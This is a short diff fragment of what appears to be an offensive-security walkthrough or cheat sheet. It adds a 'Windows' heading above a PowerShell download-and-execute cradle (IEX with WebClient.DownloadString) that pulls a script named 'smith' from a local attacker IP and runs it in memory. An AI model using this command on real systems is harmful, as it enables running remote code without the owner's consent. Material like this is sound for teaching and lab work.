@@ -159,6 +159,7 @@ Kali Linux
 $ cat smith
 whoami
 ```
+Windows
 ```
 IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.2.118/smith')
 ```
